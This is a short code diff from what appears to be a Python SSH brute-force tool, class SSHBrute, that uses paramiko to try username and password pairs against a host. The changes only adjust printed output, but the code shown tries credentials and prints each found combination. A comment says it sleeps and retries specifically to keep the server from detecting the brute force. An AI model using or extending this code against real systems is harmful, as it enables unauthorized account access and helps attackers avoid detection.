@@ -30,21 +30,21 @@ class SSHBrute(threading.Thread):
             client.connect(hostname=hostname, username=username, password=password, timeout=3)
         except socket.timeout:
             # Do when host is unreachable
-            print(f"{RED}[SSH] Host: {hostname} is unreachable, timed out.{RESET}")
+            print(f"{RED}\n[SSH] Host: {hostname} is unreachable, timed out.{RESET}")
             return False
         except paramiko.AuthenticationException:
             # Do when username and password combination is incorrect
-            print(f"[SSH] Invalid credentials for {username}:{password}")
+            # print(f"\n[SSH] Invalid credentials for {username}:{password}")
             return False
         except paramiko.SSHException:
             # Prevent server from detecting the brute force
-            print(f"{BLUE}[SSH] Quota exceeded, retrying with delay...{RESET}")
+            print(f"{BLUE}\n[SSH] Quota exceeded, retrying with delay...{RESET}")
             # Sleep for a minute
             time.sleep(60)
             return self.ssh_brute(hostname, username, password)
         else:
             # Connection has been established
-            print(f"{GREEN}[SSH] Found combo:\n\tHostname: {hostname}\n\tUsername: {username}\n\tPassword: {password}{RESET}")
+            print(f"{GREEN}\n[SSH] Found combo:\n\tHostname: {hostname}\n\tUsername: {username}\n\tPassword: {password}{RESET}")
             return True
 
     def run(self):
